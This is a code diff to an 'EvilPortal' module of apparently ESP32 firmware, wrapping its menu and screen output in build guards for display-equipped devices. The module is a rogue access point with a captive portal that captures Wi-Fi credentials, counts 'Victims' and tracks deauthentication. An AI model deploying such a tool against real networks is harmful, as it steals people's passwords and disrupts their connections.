@@ -44,6 +44,7 @@ bool EvilPortal::setup() {
     };
     addOptionToMainMenu();
 
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     if (!_verifyPwd) {
         // Insert Options
         options.insert(options.begin(), {"Default", [=]() { loadDefaultHtml(); }});
@@ -52,6 +53,7 @@ bool EvilPortal::setup() {
     }
 
     loopOptions(options);
+    #endif
 
     if (returnToMenu) return false;
 
@@ -62,6 +64,7 @@ bool EvilPortal::setup() {
         if (bruceConfig.evilWifiNames.empty()) {
             apName_from_keyboard();
         } else {
+            #if defined(HAS_TFT) || defined(HAS_SCREEN)
             options = {
                 {"Custom Wifi", [&]() { apName_from_keyboard(); }}
             };
@@ -71,24 +74,29 @@ bool EvilPortal::setup() {
             }
 
             loopOptions(options);
+            #endif
         }
     }
 
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     options = {
         {"172.0.0.1",   [&]() { apGateway = IPAddress(172, 0, 0, 1); }  },
         {"192.168.4.1", [&]() { apGateway = IPAddress(192, 168, 4, 1); }},
     };
 
     loopOptions(options);
+    #endif
 
     Serial.println("Evil Portal output file: " + outputFile);
     return true;
 }
 
 void EvilPortal::beginAP() {
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     drawMainBorderWithTitle("EVIL PORTAL");
 
     displayTextLine("Starting...");
+    #endif
     // WIFI_MODE_APSTA captive portal takes time to popup, but is useful for verifying Wifi credentials
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
@@ -206,19 +214,26 @@ void EvilPortal::loop() {
 }
 
 void EvilPortal::drawScreen() {
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     drawMainBorderWithTitle("EVIL PORTAL");
+    #endif
 
     String subtitle = "AP: " + apName.substring(0, 30);
     if (apName.length() > 30) subtitle += "...";
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     printSubtitle(subtitle);
+    #endif
 
     String apIp = WiFi.softAPIP().toString();
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     padprintln("");
     padprintln("-> " + apIp + "/creds");
     padprintln("-> " + apIp + "/ssid");
 
     padprintln("");
+    #endif
 
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     if (!_verifyPwd) {
         padprint("Victims: " + String(totalCapturedCredentials));
     } else {
@@ -229,9 +244,11 @@ void EvilPortal::drawScreen() {
     printLastCapturedCredential();
 
     printDeauthStatus();
+    #endif
 }
 
 void EvilPortal::printLastCapturedCredential() {
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     while (lastCred.length()) {
         int newlineIndex = lastCred.indexOf('\n');
         if (newlineIndex > -1) {
@@ -242,9 +259,11 @@ void EvilPortal::printLastCapturedCredential() {
             lastCred = "";
         }
     }
+    #endif
 }
 
 void EvilPortal::printDeauthStatus() {
+    #if defined(HAS_TFT) || defined(HAS_SCREEN)
     if (!_deauth || isDeauthHeld) {
         printFootnote("Deauth OFF");
     } else {
@@ -252,6 +271,7 @@ void EvilPortal::printDeauthStatus() {
         printFootnote("Deauth ON");
         tft.setTextColor(bruceConfig.priColor);
     }
+    #endif
 }
 
 void EvilPortal::loadCustomHtml() {
